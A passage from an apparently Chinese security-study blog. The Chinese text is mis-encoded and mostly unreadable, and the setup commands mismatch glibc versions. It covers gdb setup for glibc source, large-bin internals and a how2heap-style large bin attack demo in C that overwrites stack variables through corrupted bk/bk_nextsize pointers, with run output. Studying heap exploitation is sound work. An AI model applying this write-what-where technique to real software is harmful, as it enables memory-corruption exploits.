<h4 id="1-ä¸‹è½½å¹¶è§£å‹glibcæºç "><a href="#1-ä¸‹è½½å¹¶è§£å‹glibcæºç " class="headerlink" title="1.ä¸‹è½½å¹¶è§£å‹glibcæºç "></a>1.ä¸‹è½½å¹¶è§£å‹glibcæºç </h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install glibc-source</span><br><span class="line">cd /usr/src/glibc</span><br><span class="line">sudo tar xvf glibc-2.23.tar.xz </span><br></pre></td></tr></table></figure>

<h4 id="2-é…ç½®GDB"><a href="#2-é…ç½®GDB" class="headerlink" title="2.é…ç½®GDB"></a>2.é…ç½®GDB</h4><p>æ‰“å¼€gdbé…ç½®æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim ~/.gdbinit</span><br></pre></td></tr></table></figure>

<p>åœ¨é¦–è¡ŒåŠ å…¥ä»¥ä¸‹å†…å®¹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">directory /usr/src/glibc/glibc-2.23/malloc:/usr/src/glibc/glibc-2.23/elf</span><br></pre></td></tr></table></figure>

<h3 id="è°ƒåˆ«çš„ç‰ˆæœ¬çš„æºç "><a href="#è°ƒåˆ«çš„ç‰ˆæœ¬çš„æºç " class="headerlink" title="è°ƒåˆ«çš„ç‰ˆæœ¬çš„æºç "></a>è°ƒåˆ«çš„ç‰ˆæœ¬çš„æºç </h3><h4 id="1-é€‰æ‹©-glibc-ç‰ˆæœ¬ä¸‹è½½ã€è§£å‹"><a href="#1-é€‰æ‹©-glibc-ç‰ˆæœ¬ä¸‹è½½ã€è§£å‹" class="headerlink" title="1.é€‰æ‹© glibc ç‰ˆæœ¬ä¸‹è½½ã€è§£å‹"></a>1.é€‰æ‹© glibc ç‰ˆæœ¬ä¸‹è½½ã€è§£å‹</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://ftp.gnu.org/gnu/glibc/glibc-2.29.tar.gz</span><br><span class="line">tar xvf glibc-2.23.tar.gz</span><br></pre></td></tr></table></figure>

<h4 id="2-å°†è§£å‹å¾—åˆ°çš„æ–‡ä»¶å¤¹æ”¾åˆ°-usr-src-glibcä¸‹"><a href="#2-å°†è§£å‹å¾—åˆ°çš„æ–‡ä»¶å¤¹æ”¾åˆ°-usr-src-glibcä¸‹" class="headerlink" title="2.å°†è§£å‹å¾—åˆ°çš„æ–‡ä»¶å¤¹æ”¾åˆ°/usr/src/glibcä¸‹"></a>2.å°†è§£å‹å¾—åˆ°çš„æ–‡ä»¶å¤¹æ”¾åˆ°/usr/src/glibcä¸‹</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mv glibc-2.29 /usr/src/glibc</span><br></pre></td></tr></table></figure>

<h4 id="3-æ›´æ”¹GDBé…ç½®"><a href="#3-æ›´æ”¹GDBé…ç½®" class="headerlink" title="3.æ›´æ”¹GDBé…ç½®"></a>3.æ›´æ”¹GDBé…ç½®</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vim ~/.gdbinit</span><br><span class="line">directory /usr/src/glibc/glibc-2.29/malloc:/usr/src/glibc/glibc-2.29/elf</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·gdbå°±ä¼šè¯»æŒ‡å®šç‰ˆæœ¬çš„æºç äº†ï¼Œä½†æ˜¯è¦æ³¨æ„è°ƒè¯•çš„elfè¦patchelfæˆå¯¹åº”ç‰ˆæœ¬çš„</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/12/large-bin/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPtçš„Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/12/large-bin/" class="post-title-link" itemprop="url">large-bin</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-05-12 14:41:30" itemprop="dateCreated datePublished" datetime="2022-05-12T14:41:30+08:00">2022-05-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2022-05-15 20:37:21" itemprop="dateModified" datetime="2022-05-15T20:37:21+08:00">2022-05-15</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="large-binçš„ç»“æ„"><a href="#large-binçš„ç»“æ„" class="headerlink" title="large binçš„ç»“æ„"></a>large binçš„ç»“æ„</h3><p>å› ä¸ºæ¯ä¸ªlarge binä¸­ä¿å­˜çš„éƒ½æ˜¯ä¸€ä¸ªèŒƒå›´å†…çš„chunkï¼Œè€Œä¸”å…¶ä½¿ç”¨äº†<code>fd_nextsize</code>å’Œ<code>bk_nextsize</code>ï¼Œæ‰€ä»¥ä½¿å¾—large binçš„ç»“æ„ç›¸å¯¹å¤æ‚ã€‚æƒ³ææ˜ç™½è¿™ä¸ªè¿˜æ˜¯è‡ªå·±å†™ä¸ªdemoå»gdbé‡Œçœ‹çœ‹ä¼šæ¯”è¾ƒæ¸…æ¥šã€‚</p>
<p>å…¶å®é™…ä¸Šæ˜¯è¿™æ ·çš„ï¼š</p>
<ol>
<li>ä¸€ä¸ªlarge binä¸­ä¸åŒå¤§å°çš„chunkæŒ‰å¤§å°é¡ºåºæ’åˆ—</li>
<li>ä¸€ä¸ªlarge binä¸­ç›¸åŒå¤§å°çš„chunkæŒ‰freeæ‰çš„æ—¶é—´å…ˆåæ’åˆ—ï¼Œåfreeæ‰çš„æ’å…¥åˆ°èŠ‚å¤´ï¼ˆè¿™ä¸ªåè¯å¯èƒ½ä¸å¤ªå‡†ç¡®ï¼Œç»“åˆä¸‹é¢çš„å›¾ç‰‡æ„ä¼šä¸€ä¸‹å³å¯ï¼‰</li>
<li>large binä¸­æ‰€æœ‰chunkçš„fd/bkæŒ‡é’ˆéƒ½ä¼šè¢«ä½¿ç”¨ï¼Œfd/bkæŒ‡é’ˆå°†æ‰€æœ‰chunkï¼ˆè·Ÿlarge binï¼‰è¿æ¥æˆä¸€ä¸ªåŒå‘é“¾è¡¨</li>
<li><code>fd_nextsize</code>è·Ÿ<code>bk_nextsize</code>åªä¼šåœ¨large binä¸­æ¯ä¸€ä¸ªç‰¹å®šå¤§å°çš„ç¬¬ä¸€ä¸ªchunkä¸­ä½¿ç”¨ï¼Œè¿™ä¸¤ä¸ªæŒ‡é’ˆå°†åŒä¸€ä¸ªlarge binä¸­æ¯ä¸€ä¸ªç‰¹å®šå¤§å°çš„ç¬¬ä¸€ä¸ªchunkè¿æ¥æˆä¸€ä¸ªåŒå‘é“¾è¡¨</li>
<li>å¦‚æœä¸€ä¸ªlarge binä¸­åªæœ‰ä¸€ä¸ªç‰¹å®šå¤§å°çš„chunkï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªchunkçš„<code>fd_nextsize</code>è·Ÿ<code>bk_nextsize</code>éƒ½æŒ‡å‘è‡ªå·±</li>
</ol>
<p>æ¥ä¸‹æ¥ç»“åˆå›¾ç‰‡æ¥çœ‹å°±å¾ˆç®€å•äº†</p>
<p>æˆ‘ä»¬å°†ä¸€ä¸ª0x460ã€ä¸¤ä¸ª0x450ï¼Œä¸€ä¸ª0x440çš„chunkæ”¾åˆ°large binä¸­ï¼Œå› ä¸º[0x440-0x480)å¤§å°å±äºåŒä¸€ä¸ªlarge binï¼Œæ‰€ä»¥è¿™å››ä¸ªchunkä¼šè¢«æ”¾åˆ°åŒä¸€ä¸ªlarge binä¸­ã€‚è¿™å››ä¸ªchunkåœ¨large binä¸­å½¢æˆçš„å®Œæ•´ç»“æ„å¦‚ä¸‹ï¼š</p>
<img src="/2022/05/12/large-bin/large-bin-1.jpg" class>

<p>çœ‹ç€ç¡®å®å¾ˆä¹±ï¼Œä½†æ˜¯æˆ‘ä»¬æŠŠfd/bkè·Ÿfd_nextsize/bk_nextsizeåˆ†å¼€çœ‹å°±ä¼šå¥½å¾ˆå¤š</p>
<p>æŠŠfd_nextsize/bk_nextsizeå»æ‰ï¼š</p>
<img src="/2022/05/12/large-bin/large-bin-2.png" class>

<p>ç°åœ¨å°±å¾ˆæ˜äº†äº†ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸‰ç‚¹<code>large binä¸­æ‰€æœ‰chunkçš„fd/bkæŒ‡é’ˆéƒ½ä¼šè¢«ä½¿ç”¨ï¼Œfd/bkæŒ‡é’ˆå°†æ‰€æœ‰chunkï¼ˆè·Ÿlarge binï¼‰è¿æ¥æˆä¸€ä¸ªåŒå‘é“¾è¡¨</code></p>
<p>ç°åœ¨æŠŠfd/bkå»æ‰ï¼š</p>
<img src="/2022/05/12/large-bin/large-bin-3.jpg" class>

<p>è¿™å°±æ˜¯ç¬¬å››ç‚¹çš„æ„æ€ï¼Œå¯ä»¥çœ‹åˆ°ç¬¬äºŒä¸ª0x450çš„chunkå¹¶æ²¡æœ‰ä½¿ç”¨<code>fd_nextsize/bk_nextsize</code></p>
<h3 id="large-binæ‹†é“¾"><a href="#large-binæ‹†é“¾" class="headerlink" title="large binæ‹†é“¾"></a>large binæ‹†é“¾</h3><p>ç†è§£äº†ä¸Šé¢large binçš„ç»“æ„ä¹‹åï¼Œå†æ¥å­¦ä¹ large binçš„æ‹†é“¾è¿‡ç¨‹ï¼Œä¹Ÿå°±æ˜¯ä»ä¸€ä¸ªlarge binä¸­å–å‡ºchunkçš„è¿™ä¸ªè¿‡ç¨‹ã€‚</p>
<p>æ€»çš„æ¥è¯´å…¶å®å¾ˆç®€å•ï¼Œæˆ‘ä»¬å¯ä»¥åˆ†æˆä¸¤ä¸ªé“¾è¡¨æ¥çœ‹ï¼šâ‘  ç”±<code>fd_nextsize/bk_nextsize</code>ç»„æˆçš„åŒå‘é“¾è¡¨ã€‚â‘¡ ç”±<code>fd/bk</code>ç»„æˆçš„åŒå‘é“¾è¡¨ã€‚ï¼ˆä¸ºäº†æ–¹ä¾¿å™è¿°ï¼Œæˆ‘ä»¬å°†è¿™ä¸¤ç§é“¾è¡¨ç§°ä¸ºé“¾è¡¨â‘ è·Ÿé“¾è¡¨â‘¡ï¼‰</p>
<p>ä»»æ„ä¸€ä¸ªchunkä»binä¸­è¢«å–å‡ºåéƒ½è¦ä¿æŒbiné“¾è¡¨çš„å®Œæ•´æ€§ï¼Œæ‰€ä»¥ä¼šå¯¹è¿™ä¸ªchunkæ‰€å±çš„é“¾è¡¨è¿›è¡Œç»´æŠ¤ï¼Œå…·ä½“æ¥è¯´å°±æ˜¯ä¿®æ”¹è¿™ä¸ªchunkåœ¨æ‰€å±é“¾è¡¨ä¸­å…¶å‰åchunkçš„å¯¹åº”æŒ‡é’ˆã€‚å¦‚æœè¿™ä¸ªchunkä»…å±äºé“¾è¡¨â‘¡ï¼Œé‚£ä¹ˆåšå¦‚ä¸‹ä¿®æ”¹ï¼ˆPå°±æ˜¯å½“å‰chunkï¼‰ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;fd-&gt;bk = P-&gt;bk;</span><br><span class="line">P-&gt;bk-&gt;fd = P-&gt;fd;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœè¿™ä¸ªchunkåŒæ—¶å±äºé“¾è¡¨â‘ ï¼Œé‚£ä¹ˆè¿˜éœ€è¦å¦‚ä¸‹ä¿®æ”¹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;fd_nextsize-&gt;bk_next_size = P-&gt;bk_nextsize;</span><br><span class="line">p-&gt;bk_nextsize-&gt;fd_next_size = P-&gt;fd_nextsize;</span><br></pre></td></tr></table></figure>

<p>ä»¥ä¸Šè¿™éƒ¨åˆ†ç¨å¾®ç”»ç”»å›¾å°±æ‡‚äº†ï¼Œæ‰€ä»¥ä¸è´´å›¾äº†</p>
<h3 id="large-bin-attackæ€»ç»“"><a href="#large-bin-attackæ€»ç»“" class="headerlink" title="large bin attackæ€»ç»“"></a>large bin attackæ€»ç»“</h3><p>åŸç†æˆ‘è§‰å¾—æˆ‘æå¾—æ¯”è¾ƒæ‡‚äº†ï¼Œä½†æ˜¯åœ¨å®ä¾‹ä¸­ä¹Ÿä»…åœ¨è‡ªå·±å†™çš„ä¸€äº›demoä¸­åˆ©ç”¨è¿‡ï¼Œåˆ°æ—¶åœ¨é¢˜ç›®ä¸­é‡åˆ°äº†å†å›æ¥è¡¥ä¾‹é¢˜ã€‚</p>
<p>è¯¥æ”»å‡»æ–¹æ³•å®ç°çš„æ˜¯å°†ä¸€ä¸ªå †åœ°å€å†™å…¥åˆ°ä»»æ„ä¸€/ä¸¤ä¸ªåœ°å€å½“ä¸­</p>
<p>æ¡ä»¶ï¼š</p>
<ol>
<li>èƒ½æ§åˆ¶æŸä¸€ä¸ªlarge binçš„bkæˆ–è€…bk_nextsizeå­—æ®µ</li>
<li>å³å°†å…¥binçš„chunkå¿…é¡»ç´§è´´è¢«ä¿®æ”¹çš„large bin chunkï¼Œæ„æ€å°±æ˜¯æ­£å¸¸æƒ…å†µä¸‹è¿™ä¸ªå³å°†å…¥binçš„chunkå¿…é¡»æ’å…¥åˆ°è¢«ä¿®æ”¹çš„chunkçš„å·¦ä¾§æˆ–å³ä¾§ï¼ˆç»“åˆç»“æ„å›¾æ„ä¼šä¸€ä¸‹ï¼‰</li>
</ol>
<p>åˆ©ç”¨æ–¹å¼ï¼š</p>
<ol>
<li>å°†ä¸€ä¸ªlarge bin chunkçš„bk/bk_nextsizeå­—æ®µåˆ†åˆ«ä¿®æ”¹ä¸º(add - 2)ã€(addr - 4)</li>
<li>è®©ç¨‹åºä»unsorted binä¸­å°†ä¸€ä¸ªchunkæ’å…¥åˆ°è¿™ä¸ªè¢«ä¿®æ”¹çš„large bin chunkçš„å·¦ä¾§/å³ä¾§</li>
</ol>
<p>æ ¹æ®è¦æ’å…¥large binçš„chunkï¼ˆç§°è¿™ä¸ªchunkä¸ºvictimï¼‰è·Ÿè¢«ä¿®æ”¹çš„large bin chunkï¼ˆç§°è¿™ä¸ªchunkä¸ºPï¼‰çš„ç›¸å¯¹å¤§å°ï¼Œç»†åˆ†æ¥è¯´æœ‰ä¸¤ç§æƒ…å†µï¼š</p>
<ol>
<li><p>victim<strong>å¤§äº</strong>Pï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ä¼šå®Œæˆä¸¤å¤„å†™å…¥ï¼š</p>
<p>â‘  å°†victimçš„åœ°å€å†™å…¥åˆ°<code>P-&gt;bk-&gt;fd</code>å¤„ã€‚â‘¡ å°†victimçš„åœ°å€å†™å…¥åˆ°<code>P-&gt;bk_nextsize-&gt;fd_nextsize</code>å¤„</p>
</li>
<li><p>victim<strong>å°äº</strong>Pï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹åªä¼šå®Œæˆä¸€å¤„å†™å…¥ï¼š</p>
<p>å°†victimçš„åœ°å€å†™å…¥<code>P-&gt;bk_nextsize-&gt;fd_nextsize</code>å¤„</p>
</li>
</ol>
<p>ï¼ˆæ³¨æ„å¤§å°ç›¸ç­‰æ—¶æ— æ³•åˆ©ç”¨ï¼‰</p>
<p>libcç‰ˆæœ¬é—®é¢˜ï¼š</p>
<p>ä»libc-2.30å¼€å§‹åŠ å…¥äº†å¯¹large binè·³è¡¨çš„å®Œæ•´æ€§æ£€æŸ¥ï¼ˆå…·ä½“æ˜¯å•¥æˆ‘ä¹Ÿæ²¡çœ‹ï¼‰ï¼Œæ€»ä¹‹è¿™ä¸ªæ£€æŸ¥ä½¿å¾—unsorted bin chunkå¤§äºé“¾è¡¨ä¸­çš„æœ€å°çš„chunkæ—¶çš„åˆ©ç”¨å¤±æ•ˆï¼ˆä¹Ÿå°±å¯¹åº”äº†<code>victimå¤§äºP</code>çš„è¿™ç§æƒ…å†µï¼‰ï¼Œè¿™æ—¶åªèƒ½è®©victimå°äºPæ¥å®Œæˆåˆ©ç”¨ã€‚</p>
<p>æˆ‘ç¨å¾®æ”¹äº†ä¸‹ç”¨æ¥æ¼”ç¤ºlarge bin attackçš„demoï¼Œä¸»è¦æ˜¯é¿å…äº†tacheçš„å½±å“ï¼Œå°†è¯¥æºç ç”Ÿæˆçš„ç¨‹åºåœ¨libc-2.30ä»¥ä¸Šè¿è¡Œ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x510</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x610</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x610</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="keyword">void</span>* p4 = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x631</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="keyword">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="keyword">void</span> *)stack_var2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„åˆ°ç¬¬18è¡Œæ”¹p2çš„sizeé‚£ä¸€æ­¥ï¼Œå°†å…¶æ”¹æˆ0x631å°±å¯¹åº”äº†<code>victimå°äºP</code>çš„è¿™ç§æƒ…å†µï¼Œå› ä¸ºè¿™ç§æƒ…å†µè¿˜æ˜¯èƒ½å¤Ÿåˆ©ç”¨çš„ï¼Œæ‰€ä»¥æœ€åç¨‹åºè¿è¡Œç»“æœä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ./a.out</span><br><span class="line">stack_var1 (0x7ffc890c2258): (nil)</span><br><span class="line">stack_var2 (0x7ffc890c2260): 0xc63e30</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°åªå®Œæˆäº†ä¸€å¤„å†™å…¥</p>
<p>ä½†æ˜¯å¦‚æœå°†Pçš„å¤§å°æ”¹æˆå¦‚0x611ï¼Œä¹Ÿå°±æ˜¯å¯¹åº”<code>victimå¤§äºP</code>çš„è¿™ç§æƒ…å†µï¼Œç”±äºæ–°åŠ å…¥çš„æ£€æŸ¥å¯¼è‡´ç¨‹åºä¼šå´©æºƒ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ./a.out</span><br><span class="line">malloc(): largebin double linked list corrupted (nextsize)</span><br><span class="line">Aborted (core dumped)</span><br></pre></td></tr></table></figure>

<h3 id="ç»“åˆæºç åˆ†ælarge-bin-attack"><a href="#ç»“åˆæºç åˆ†ælarge-bin-attack" class="headerlink" title="ç»“åˆæºç åˆ†ælarge-bin-attack"></a>ç»“åˆæºç åˆ†ælarge-bin-attack</h3><p>åœ¨how2heapä¸­æ¼”ç¤ºlarge bin attackçš„æºç çš„åŸºç¡€ä¸Šåªä¿ç•™äº†é‡è¦çš„æ“ä½œéƒ¨åˆ†ï¼ŒæŠŠè¯´æ˜çš„éƒ¨åˆ†å»æ‰äº†ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x320</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="keyword">void</span>* p4 = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="keyword">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="keyword">void</span> *)stack_var2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ°ç¬¬14è¡Œä¸ºæ­¢æŠŠchunk1è·Ÿchunk2æ”¾åˆ°äº†unsorted binä¸­ï¼Œåœ¨ç¬¬15è¡Œ<code>malloc(0x90);</code>çš„è¿™ä¸€æ­¥ä¸­ï¼ŒæŒ‰ç…§glibcçš„é€»è¾‘ï¼Œç¨‹åºä¼šæ‰§è¡Œä»¥ä¸‹å‡ æ­¥ï¼š</p>
<ol>
<li>å–å‡ºunsorted binä¸­çš„æœ€åä¸€ä¸ªchunkï¼ˆp1ï¼‰</li>
<li>å› ä¸ºp1çš„å¤§å°å±äºsmall binï¼Œæ‰€ä»¥å°†å…¶æ”¾åˆ°small binï¼Œç„¶åæ ‡è®°è¿™ä¸ªsmall binä¸­æœ‰free chunk</li>
<li>å–å‡ºunsorted binä¸­çš„æœ€åä¸€ä¸ªchunkï¼ˆp2ï¼‰</li>
<li>å› ä¸ºp2çš„å¤§å°å±äºlarge binï¼Œæ‰€ä»¥å°†å…¶æ”¾åˆ°large binï¼Œå¹¶ä¸”æ ‡è®°è¿™ä¸ªlarge binä¸­æœ‰free chunk</li>
<li>æœ€åä»small binä¸­æ‰¾åˆ°äº†æ»¡è¶³ç”³è¯·éœ€æ±‚çš„chunkï¼ˆp1ï¼‰ï¼Œä»p1ä¸­å‰²ä¸‹éœ€æ±‚çš„å¤§å°ï¼ˆ0xa0ï¼‰ï¼Œå¹¶ä¸”æŠŠå‰©ä½™éƒ¨åˆ†ï¼ˆ0x330-0xa0ï¼‰æ”¾åˆ°unsorted binä¸­</li>
</ol>
<h4 id="ä»unsorted-binä¸­å–å‡ºchunk"><a href="#ä»unsorted-binä¸­å–å‡ºchunk" class="headerlink" title="ä»unsorted binä¸­å–å‡ºchunk"></a>ä»unsorted binä¸­å–å‡ºchunk</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">3521</span>           <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">â–º <span class="number">3522</span>           unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">  <span class="number">3523</span>           bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­<code>av</code>æ˜¯<code>main_arena</code>çš„èµ·å§‹åœ°å€ï¼Œ<code>unsorted_chunks(av)</code>è¡¨ç¤ºæ‰¾åˆ°unsorted biné“¾è¡¨ï¼Œ<code>unsorted_chunks (av)-&gt;bk</code>å°±è¡¨ç¤ºå–unsorted biné“¾è¡¨çš„bkæŒ‡é’ˆï¼ˆä¹Ÿå°±æ˜¯unsorted biné“¾è¡¨çš„æœ€åä¸€ä¸ªchunkï¼‰</p>
<p>åŒæ—¶<code>victim</code>æ˜¯å½“å‰è¦å–å‡ºçš„chunkï¼Œ<code>bck == victim-&gt;bk</code></p>
